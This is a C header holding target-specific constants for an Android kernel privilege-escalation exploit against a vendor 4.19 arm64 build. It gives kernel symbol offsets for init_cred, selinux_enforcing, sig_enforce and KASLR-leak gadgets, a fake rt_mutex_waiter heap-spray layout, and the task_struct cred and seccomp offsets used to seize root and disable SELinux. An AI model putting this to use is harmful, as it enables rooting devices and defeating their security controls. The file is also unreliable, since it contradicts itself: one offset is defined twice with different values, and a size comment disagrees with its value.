#ifndef TARGET_H
#define TARGET_H

/*
 * Target: OPPO/oplus vendor kernel 4.19.157-perf-g9607d8651312 (aarch64)
 *   banner : Linux version 4.19.157-perf-g9607d8651312
 *            (builder@pangu-build-component-vendor-163337-twtsj-c9c61-g70xg)
 *            #1 SMP PREEMPT Wed Oct 11 07:34:29 UTC 2023, clang 10.0.7
 *   boot hdr: ANDROID! v3, os_version 13.0.0, patch 2023-10
 * Provenance: every value below is extracted from the target boot.img
 *   (kallsyms / ikheaders / RELA table), NOT copied from Pixel targets.
 *   See analysis/logs/step*.json for machine-readable evidence.
 *
 * Confidence tags:
 *   [A] kallsyms-direct (symbol address from kernel's own kallsyms)
 *   [B] struct-layout engine validated by RELA-table + scalar anchors
 *   [C] 4.19 upstream definition (version-stable struct)
 *   [D] assumption -> must be confirmed at runtime (round 2)
 */

#define BUILD_VARIANT_LABEL "vivo_pd2118_4.19.152_perf"
#ifndef BUILD_FINGERPRINT
/* device fingerprint TBD at runtime (drive.txt proven untrustworthy) */
#define BUILD_FINGERPRINT "oplus/unknown/unknown:13/RKQ1.xxx/xxx:user/release-keys"
#endif

/* ---------------- address space ----------------
 * VA_BITS = 39 (CONFIG_ARM64_VA_BITS=39, extracted from the device boot.img
 * IKCONFIG blob). Values derived from 4.19.152 asm/memory.h:
 *   VA_START      = 0xffffffffffffffff - (1<<39) + 1 = 0xffffff8000000000
 *   PAGE_OFFSET   = 0xffffffffffffffff - (1<<38) + 1 = 0xffffffc000000000
 *   MODULES_END   = VA_START + 128M                 = 0xffffff8008000000
 *   KIMAGE_VADDR  = MODULES_END                     -> _text = +0x80000
 *   VMEMMAP_SIZE  = 1 << (39-12-1+6) = 4G
 *   VMEMMAP_START = PAGE_OFFSET - 4G                = 0xffffffbf00000000
 * Cross-checks on the device kernel image (2025-12-24 build):
 *   - 0xffffffbf00000000 is materialised 145x in .text (virt_to_page inlines),
 *     which independently confirms both VMEMMAP_START and PAGE_OFFSET.
 *   - the perf-leaked image base lands ~11 GB above KIMAGE_VADDR, i.e. inside
 *     the vmalloc area, which only works with the linear map above it.
 * NOTE: the K40 target shipped PAGE_OFFSET/DIRECT_MAP_BASE as
 * 0xffffff8000000000 - that is the MODULES region, not the linear map, and it
 * is what made KernelSnitch reject every real mm_struct on this device.
 */
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL          /* [A] kallsyms _text */
#define KIMAGE_TEXT_SIZE 0x1980000ULL                   /* [A] _etext - _text */
#define KIMAGE_TEXT_OFFSET 0x80000ULL                   /* [A] text_offset */
#define P0_PAGE_OFFSET 0xffffffc000000000ULL            /* [A] 39-bit VA linear map */
#define P0_PHYS_OFFSET 0x80000000ULL                    /* [D] qcom standard; verify /proc/iomem */
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL               /* [B] PHYS + Image text_offset 0x80000 */
/* ---- linear map (== KASAN-off direct map) -------------------------------
 * IMPORTANT: PAGE_OFFSET is NOT the runtime base of the linear map.
 * arm64 4.19 randomises it under CONFIG_RANDOMIZE_BASE (verified in-image at
 * 0x2588c18..0x2588c48, reading memstart_offset_seed):
 *
 *     range = (256G - dram_span) >> 30          // in GB
 *     shift = ((range * seed) << 14) & ~(1G-1)  // whole GB, <= 247 GB
 *     memstart_addr -= shift
 *
 * so   VA(phys) = PAGE_OFFSET + shift + phys - PHYS_OFFSET
 * and the whole 256 GB region must be treated as the possible window.
 * `g_direct_map_base` (= PAGE_OFFSET + shift - PHYS_OFFSET) is resolved at
 * runtime; DIRECT_MAP_BASE is only the shift==0 default. On device
 * (2025-12-24 build) the shift measured ~127 GB. */
#define LINEAR_MAP_START 0xffffffc000000000ULL            /* PAGE_OFFSET */
#define LINEAR_MAP_END 0xffffffffc0000000ULL              /* +255 GB */
#define LINEAR_MAP_MAX_SHIFT_GB 247
#define KERNELSNITCH_IDENTITY_START LINEAR_MAP_START
#define KERNELSNITCH_IDENTITY_END LINEAR_MAP_END
#define DIRECT_MAP_BASE 0xffffffc000000000ULL
#define DIRECT_MAP_END LINEAR_MAP_END
#define VMEMMAP_START 0xffffffbf00000000ULL             /* [A] PAGE_OFFSET - 4G */

/* ---------------- pselect stack-frame geometry ----------------
 * Both syscalls enter through the same el0_svc frame, so the caller depth
 * cancels out and only the two syscall bodies matter:
 *
 *   __arm64_sys_futex      sub sp,sp,#0xc0    (epilogue: add sp,sp,#0xc0)
 *   do_futex               stp x29,x30,[sp,#-0x60]! ; mov x29,sp
 *                          rt_waiter = x29 - 0xc8
 *                          => rt_waiter_abs = S - 0xc0 - 0x60 - 0xc8 = S - 0x1e8
 *
 *   __arm64_sys_pselect6   sub sp,sp,#0x80, x29 = sp + 0x30
 *   core_sys_select        sub sp,sp,#0x1c0, stack_fds = sp + 0x50
 *                          nfds=320 -> FDS_BYTES = 40 -> 5 words per set
 *                          => stack_fds_abs = S - 0x80 - 0x1c0 + 0x50 = S - 0x1f0
 *
 *   => rt_waiter == stack_fds + 1 word  =>  fake waiter starts at global
 *      fd_set word 1, i.e. in[1] (fds.in covers words 0..4, fds.out 5..9,
 *      fds.ex 10..14).  PSELECT_WAITER_WORD_SHIFT==1 is therefore correct and
 *      is now actually applied by prepare_pselect_fdsets().
 */
/* MEASURED on device (2026-11-20): the fake waiter really starts at fd_set
 * word 5, i.e. stack_fds + 0x28, not +0x08 as the "both syscalls enter with
 * the same S" derivation predicted (the pselect6 wrapper/dispatch is 0x20
 * deeper than modelled). Confirmed by scanning GHOSTLOCK_WAITER_SHIFT with
 * GHOSTLOCK_ZERO_LOCK: only shift 5 survives all 24 route attempts, every
 * other shift hard-resets the device. */
#define PSELECT_WAITER_WORD_SHIFT 5
#define PSELECT_WORDS_PER_SET ((PSELECT_ROUTE_NFDS + 63) / 64)

/* ---------------- round-2 adaptation switches ---------------- */
#define CFGOPS_4_19_STYLE 1        /* put configfs_read_file/write_bin_file at .read/.write (not iter) */
#define KMALLOC_419 1              /* 3 cache types (NORMAL/RECLAIM/DMA), no cg caches */
#define KMALLOC_PIPE_INDEX 10      /* legacy pipe 16-slot bufs array: 16*0x28=640B -> kmalloc-1024 */
#define KMALLOC_PIPE_OBJ_SIZE 0x400
#define KMALLOC_CACHE_TYPES 3      /* 4.19 NR_KMALLOC_TYPES */
/* [A] ashmem_open() memcpy()s "dev/ashmem/" (11 bytes) into name[0] and
 * SET_NAME does strcpy(asma + 0xb, user_string): user bytes start at asma+0xb. */
#define ASHMEM_NAME_PREFIX_LEN 11
#define ASHMEM_PREFIX_COUNT 0      /* 6.x prefix arithmetic disabled on 4.19 */
/* on-device verified: mm_cachep object size == 0x340 (found via retry). */
#define MM_STRUCT_SZ 0x3C0

/* KASLR leak: direct /proc/kallsyms + dmesg are tried first (CFGOPS_4_19_STYLE
 * disables the boot_id rb-gadget, which needs per-build values and would panic
 * with the placeholder SLIDE_LOGGERS_0_1 / SLIDE_RANDOM_BOOT_ID_DATA). */

/* ---------------- symbol offsets (off = sym - KIMAGE_TEXT_BASE) ---------------- */
/* mm_cachep (file offset 0x306cd78): the mm_struct slab cache, so its
 * size/object_size/oo can be read at runtime instead of assumed */
#define MM_CACHEP_OFF 0x2864d78ULL
#define MM_CACHEP (KIMAGE_TEXT_BASE + MM_CACHEP_OFF)
#define NOOP_LLSEEK_OFF 0x0027f2e0ULL                   /* [A] noop_llseek */
#define ASHMEM_MISC_FOPS_OFF 0x02f46a30ULL              /* [A] ashmem_misc + 0x10 = miscdevice.fops slot */
#define ASHMEM_FOPS_OFF 0x01e729a0ULL                   /* [A] ashmem_fops */
#define ASHMEM_IOCTL_OFF 0x00dbba20ULL                  /* [A] ashmem_ioctl */
#define ASHMEM_COMPAT_IOCTL_OFF 0x00dbc150ULL           /* [A] compat_ashmem_ioctl (4.19 name) */
#define ASHMEM_MMAP_OFF 0x00dbc1a0ULL                   /* [A] ashmem_mmap */
#define ASHMEM_OPEN_OFF 0x00dbc310ULL                   /* [A] ashmem_open */
#define ASHMEM_RELEASE_OFF 0x00dbc3a0ULL                /* [A] ashmem_release */
#define ASHMEM_SHOW_FDINFO_OFF 0x00dbc428ULL            /* [A] ashmem_show_fdinfo */
#define CONFIGFS_READ_ITER_OFF 0x0033cf50ULL            /* [A] configfs_read_file (4.19 has no read_iter) */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0033d400ULL       /* [A] configfs_write_bin_file (4.19 name) */
#define COPY_SPLICE_READ_OFF 0x002c9cb0ULL              /* [A] generic_file_splice_read (4.19 substitute) */
#define NOOP_LLSEEK_OFF 0x00286160ULL                   /* [A] noop_llseek */
/* init_task is 8 bytes BELOW the old 0x2da0eb8. The real base is pinned by
 * four independent fields at once: usage=2 @0x68, flags=PF_KTHREAD @0x6c,
 * prio/static/normal=120 @0xac/0xb0/0xb4 and comm="swapper" @0x7e8. With the
 * old value text_addr(INIT_TASK) pointed 8 bytes past the previous struct, so
 * rt_mutex_setprio() read pi_task->prio = 0, missed the prio-equal early exit
 * and walked the full rq/sched_class path with sched_class == 0 -> panic. */
#define INIT_TASK_OFF 0x02da0ec0ULL                     /* [A] init_task */
#define INIT_CRED_OFF 0x02db2f38ULL                  /* [E] found by scanning kernel_953.bin for the init_cred pattern: usage=4, uid..fsgid=0, securebits=0, cap_inheritable=0, three identical CAP_FULL_SET==0x3fffffffff at +0x30/+0x38/+0x40 */
#define INIT_UTS_NS_OFF 0x02d9ffc8ULL                   /* [A] init_uts_ns */
#define EMPTY_ZERO_PAGE_OFF 0x03069000ULL               /* [A] empty_zero_page */
#define MODULE_ALLOC_BASE_OFF 0x024cf288ULL              /* [A] u64 __ro_after_init module_alloc_base */
#define SIG_ENFORCE_OFF 0x02e069a8ULL                   /* [A] bool sig_enforce (module.sig_enforce) */
#define MODULES_DISABLED_OFF 0x03252360ULL              /* [A] int modules_disabled sysctl */
#define ROOT_TASK_GROUP_OFF 0x030701c0ULL               /* [A] root_task_group */
/* SELINUX_BLOB_SIZES: N/A on 4.19 - cred->security points directly at
 * task_security_struct; keep SELINUX_CRED_BLOB_OFF 0 below. */
#define SELINUX_STATE_OFF 0x024cffc0ULL                 /* [A] selinux_state symbol */
#define SELINUX_ENFORCING_OFF (SELINUX_STATE_OFF + 1)   /* [A] vendor layout: disabled at +0, enforcing at +1 */
#define SECURITY_HOOK_HEADS_OFF 0x024cf938ULL           /* [A] security_hook_heads */
#define KMALLOC_CACHES_OFF 0x024cf428ULL                /* [A] kmalloc_caches (4.19: 3 types NORMAL/RECLAIM/DMA - no CGROUP) */
#define ANON_PIPE_BUF_OPS_OFF 0x01cfacc0ULL             /* [A] anon_pipe_buf_ops */
#define __VFS_WRITE_OFF 0x002869c8ULL                   /* [A] __vfs_write: x20 = struct file * */

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define MODULE_ALLOC_BASE (KIMAGE_TEXT_BASE + MODULE_ALLOC_BASE_OFF)
#define SIG_ENFORCE (KIMAGE_TEXT_BASE + SIG_ENFORCE_OFF)
#define MODULES_DISABLED (KIMAGE_TEXT_BASE + MODULES_DISABLED_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ---------------- KASLR-leak (slide) gadget ----------------
 * nfulnl_logger / sysctl_bootid exist [A]; the Pixel leak chain
 * (LOGGERS_0_1 / RANDOM_BOOT_ID_DATA) is 6.x-specific -> rework required. */
#define SLIDE_NFULNL_LOGGER_OFF 0x02d965a8ULL           /* [A] nfulnl_logger */
#define SLIDE_SYSCTL_BOOTID_OFF 0x033e191cULL           /* [A] sysctl_bootid */
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
/* [B] loggers[0][0] (nf_log.c) == nfulnl_logger - 0xd8; content = &nfulnl_logger
 *     (nfnetlink_log registers NFPROTO_UNSPEC). RELA-verified boot_id sysctl
 *     entry .data slot = 0x2e33f68 (proc_do_uuid outputs table->data content
 *     when data[8]!=0 -> leaks the slid pointer). */
#define SLIDE_LOGGERS_0_1_OFF 0x02d964d0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x033dcf58ULL
#define SLIDE_WONLY_BOOTID 1                            /* [D] confirm */

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------- exploit-internal spray layout (target-independent) ---------------- */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* ---------------- rt_mutex_waiter (4.19 form) ----------------
 * 4.19: {tree_entry@0, pi_tree_entry@0x18, task@0x30, lock@0x38,
 *        prio@0x40, deadline@0x48}, size 0x50. NO wake_state / ww_ctx. [C] */
#define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48
/* WAITER_WAKE_STATE_OFF / WAITER_WW_CTX_OFF do not exist on 4.19 */

/* fake waiter spray layout. Must match the 4.19 form above: the 5.x geometry
 * (task@0x50, lock@0x58, wake_state/ww_ctx trailing) put every kernel-consumed
 * field at the wrong offset, so a walk read lock==0 and the gadget never fired.
 * Verified against task_blocks_on_rt_mutex: stp x20,x19,[waiter,#0x30] stores
 * {task, lock}, str w8,[waiter,#0x40] stores prio, str x11,[waiter,#0x48] the
 * deadline, and the rb_erase paths take tree_entry@0 / pi_tree_entry@0x18. */
#define FAKE_WAITER_TREE_ENTRY_OFF 0x00
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_PRIO_OFF 0x40
#define FAKE_WAITER_DEADLINE_OFF 0x48

/* ---------------- task_struct ----------------
 * Re-derived from this kernel's own rtmutex code (not from oplus 4.19.157):
 *
 *   rt_mutex_adjust_pi()             add x20, x0, #0x8d4   -> &task->pi_lock
 *                                    ldr  x8, [x19, #0x8f8] -> task->pi_blocked_on
 *   rt_mutex_adjust_prio_chain()     [x19, #0x8e0] pi_waiters.rb_node
 *                                    [x19, #0x8e8] pi_waiters.rb_leftmost
 *                                    [x19, #0x8f8] pi_blocked_on
 *                                    [x19, #0xac]  prio      (compared to waiter->prio)
 *                                    [x19, #0x418] dl.deadline
 *   rt_mutex_cleanup_proxy_lock()    [x0, #0x18] owner&~1 == current ?
 *   get_task_struct(fake_task)       atomic_add(1, task + 0x68)
 *
 * so: pi_lock@0x8d4 (raw_spinlock, then 4 pad) -> wake_q@0x8d8 ->
 *     pi_waiters@0x8e0 (rb_root_cached, 0x10) -> pi_top_task@0x8f0 ->
 *     pi_blocked_on@0x8f8.  The old 0x8b4/0x8c0/0x8d0/0x8d8 block was the
 *     4.19.157 oplus layout and is 0x20 too low for this build: the kernel
 *     would have taken a spinlock at fake_task+0x8d4 (0x00000000 filler ->
 *     actually "unlocked", but pi_blocked_on read from the wrong slot).
 */
#define FAKE_TASK_USAGE_OFF 0x68                        /* get_task_struct() atomic_add site */
#define FAKE_TASK_PRIO_OFF 0xac                         /* compared against waiter->prio */
#define FAKE_TASK_NORMAL_PRIO_OFF 0xb4
/* 4.19 order: prio@0xac, static_prio@0xb0, normal_prio@0xb4, rt_priority@0xb8.
 * init_task confirms 120 at 0xac/0xb0/0xb4 and 0 at 0xb8; the old value was
 * rt_priority and must stay 0. */
#define FAKE_TASK_STATIC_PRIO_OFF 0xb0
#define FAKE_TASK_TASK_GROUP_OFF 0x3c8                  /* sched_task_group (CGROUP_SCHED) */
#define FAKE_TASK_PI_LOCK_OFF 0x8d4
#define FAKE_TASK_PI_WAITERS_OFF 0x8e0
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8f0
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8f8

#define TASK_PI_LOCK_OFF 0x8d4
#define TASK_PI_WAITERS_OFF 0x8e0
#define TASK_PI_TOP_TASK_OFF 0x8f0
#define TASK_PI_BLOCKED_ON_OFF 0x8f8

#define MM_OWNER_OFF 0x310                              /* mm_struct.owner */
#define TASK_PID_OFF 0x630                /* 0xd8490: ldr w3,[x5,#0x630] */
#define TASK_TGID_OFF 0x634
#define TASK_REAL_PARENT_OFF 0x648
#define TASK_ATOMIC_FLAGS_OFF 0x600
/* MEASURED from the kernel_953 disassembly (2026-11-20):
 *   prepare_creds @0x74068  : ldr x22,[x23(current),#0x660]   -> task->cred
 *   commit_creds  @0x74344  : ldr x19,[x20(current),#0x818]   -> task->real_cred
 *                             ldr x8, [x20,#0x660]; cmp x8,x19; b.ne BUG_ON
 * so this kernel keeps real_cred and cred far apart; the old 0x7d8/0x7e0 pair
 * was wrong and writing there corrupted unrelated task_struct fields. */
#define TASK_REAL_CRED_OFF 0x818
#define TASK_CRED_OFF 0x660
#define TASK_COMM_OFF 0x7e8                /* 0xd8498: add x2,x5,#0x7e8 */
#define TASK_TASKS_OFF 0x538
#define TASK_THREAD_GROUP_OFF 0x6e8
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x890

/* ---------------- configfs_buffer (4.19, fs/configfs/file.c) ---------------- [C] */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 64
#define CFG_BIN_BUFFER_OFF 72
#define CFG_BIN_BUFFER_SIZE_OFF 80
#define CFG_CB_MAX_SIZE_OFF 84

/* ---------------- cred / seccomp / selinux ---------------- [B anchors: caps pattern] */
#define CRED_UID_OFF 4
#define CRED_SECUREBITS_OFF 36
#define CRED_CAPS_OFF 40                                /* cap_inheritable */
#define CRED_SECURITY_OFF 120                           /* 0x78 */
#define SELINUX_CRED_BLOB_OFF 0                         /* 4.19: direct task_security_struct* */
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_OFF 0x08
/* SECCOMP_FILTER_COUNT_OFF: N/A on 4.19 (count lives in seccomp_filter, not seccomp) */
#define TIF_SECCOMP_BIT 11                              /* [A] arm64 thread_info.h */
#define PFA_NO_NEW_PRIVS_BIT 0

/* ---------------- struct page ---------------- [C] */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

/* ---------------- pipe (LEGACY pre-4.9 layout - vendor quirk!) ----------------
 * This kernel ships legacy pipe_inode_info:
 * { mutex@0; wait@0x20; nrbufs@0x38; curbuf@0x3c; buffers@0x40;
 *   readers@0x44; writers@0x48; files@0x4c; waiting_writers@0x50;
 *   r_counter@0x54; w_counter@0x58; tmp_page@0x60;
 *   fasync_readers@0x68; fasync_writers@0x70; bufs@0x78; user@0x80 } size 0x88
 * 6.x ring fields (PIPE_HEAD_OFF/PIPE_TAIL_OFF/PIPE_RING_SIZE_OFF...) do NOT exist. [B] */
#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 16                            /* legacy PIPE_DEF_BUFFERS */
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_INODE_INFO_STRUCT_SIZE 0x88
#define PIPE_INODE_INFO_SIZE 0x88
#define PIPE_NRBUFS_OFF 0x38
#define PIPE_CURBUF_OFF 0x3c
#define PIPE_BUFFERS_OFF 0x40
#define PIPE_READERS_OFF 0x44
#define PIPE_WRITERS_OFF 0x48
#define PIPE_FILES_OFF 0x4c
#define PIPE_TMP_PAGE_OFF 0x60
#define PIPE_BUFS_OFF 0x78
#define PIPE_USER_OFF 0x80

/* ---------------- file_operations (4.19) ---------------- [B] */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xc0
#define FOPS_SHOW_FDINFO_OFF 0xd8

#endif
